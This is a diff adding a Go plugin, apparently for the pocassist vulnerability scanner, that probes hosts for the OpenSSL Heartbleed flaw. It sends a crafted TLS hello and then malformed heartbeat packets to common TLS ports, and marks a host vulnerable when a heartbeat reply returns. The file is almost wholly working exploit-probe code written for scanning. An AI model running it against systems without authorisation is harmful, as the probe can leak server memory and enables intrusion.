@@ -1,0 +1,152 @@
+package scripts
+
+import (
+	"encoding/binary"
+	"github.com/jweny/pocassist/pkg/util"
+	"io"
+	"net"
+	"strconv"
+	"time"
+)
+
+type openSSLVersion struct {
+	name    string
+	payload []byte
+}
+
+var openSSLPorts = []uint16{443, 995, 993, 465, 587}
+
+var openSSLVersions = []openSSLVersion{
+	{name: "SSL 3.0", payload: []byte{0x03, 0x00}},
+	{name: "TLS 1.0", payload: []byte{0x03, 0x01}},
+	{name: "TLS 1.1", payload: []byte{0x03, 0x02}},
+	{name: "TLS 1.2", payload: []byte{0x03, 0x03}},
+}
+
+var helloPayload = []byte{0x53,
+	0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf,
+	0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00,
+	0x00, 0x66, 0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88,
+	0x00, 0x87, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c,
+	0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09,
+	0xc0, 0x1f, 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44,
+	0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c,
+	0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11,
+	0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04,
+	0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19,
+	0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08,
+	0x00, 0x06, 0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13,
+	0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00,
+	0x00, 0x0f, 0x00, 0x01, 0x01,
+}
+
+func CreateOpenSSLHello(version *openSSLVersion) []byte {
+	result := make([]byte, 0, 1+2+6+2+len(helloPayload))
+	result = append(result, []byte{0x16}...)
+	result = append(result, version.payload...)
+	result = append(result, []byte{0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8}...)
+	result = append(result, version.payload...)
+	result = append(result, helloPayload...)
+	return result
+}
+
+func CreateOpenSSLHeartBleed(version *openSSLVersion) []byte {
+	result := make([]byte, 0, 1+2+5)
+	result = append(result, []byte{0x18}...)
+	result = append(result, version.payload...)
+	result = append(result, []byte{0x00, 0x03, 0x01, 0x40, 0x00}...)
+	return result
+}
+
+func OpenSSLRecvMessage(conn net.Conn) (typ int, ver int, body []byte) {
+	headerLength := 5
+	header := make([]byte, headerLength)
+	conn.SetDeadline(time.Now().Add(5 * time.Second))
+	count, err := io.ReadFull(conn, header)
+	if count != headerLength || err != nil {
+		return -1, 0, nil
+	}
+
+	typ = int(header[0])
+	ver = int(binary.BigEndian.Uint16(header[1:3]))
+	bodyLength := int(binary.BigEndian.Uint16(header[3:]))
+
+	body = make([]byte, bodyLength)
+	conn.SetDeadline(time.Now().Add(5 * time.Second))
+	count, err = io.ReadFull(conn, body)
+	if count != bodyLength || err != nil {
+		return -1, 0, nil
+	}
+	return typ, ver, body
+}
+
+// OpenSSLHeartbleedVul openssl heartbleed
+func OpenSSLHeartbleedVul(args *ScriptScanArgs) (*util.ScanResult, error) {
+	isInList := false
+	_openSSLPorts := openSSLPorts
+	if args.IsHTTPS {
+
+		for _, port := range openSSLPorts {
+			if port == args.Port {
+				isInList = true
+			}
+		}
+
+	}
+	if !isInList {
+		_openSSLPorts = append(openSSLPorts, args.Port)
+	}
+	for _, port := range _openSSLPorts {
+		for _, version := range openSSLVersions {
+			addr := args.Host + ":" + strconv.Itoa(int(port))
+			conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
+			if err != nil {
+				break
+			}
+			defer conn.Close()
+
+			conn.SetDeadline(time.Now().Add(5 * time.Second))
+			_, err = conn.Write(CreateOpenSSLHello(&version))
+			if err != nil {
+				continue
+			}
+
+			var typ int
+			var body []byte
+
+			for {
+				typ, _, body = OpenSSLRecvMessage(conn)
+				if typ == -1 || (typ == 22 && body[0] == 0x0E) {
+					break
+				}
+			}
+
+			// 发两次 heartbleed 包
+			conn.SetDeadline(time.Now().Add(5 * time.Second))
+			_, err = conn.Write(CreateOpenSSLHeartBleed(&version))
+			if err != nil {
+				continue
+			}
+			conn.SetDeadline(time.Now().Add(5 * time.Second))
+			_, err = conn.Write(CreateOpenSSLHeartBleed(&version))
+			if err != nil {
+				continue
+			}
+			typ, _, body = OpenSSLRecvMessage(conn)
+			if typ == 24 {
+				if len(body) > 3 {
+					return util.VulnerableTcpOrUdpResult(addr, "",
+						[]string{string(helloPayload)},
+						[]string{string(body)},
+					),nil
+				}
+				break
+			}
+		}
+	}
+	return &util.InVulnerableResult, nil
+}
+
+func init() {
+	ScriptRegister("poc-go-openssl-heartbleed", OpenSSLHeartbleedVul)
+}
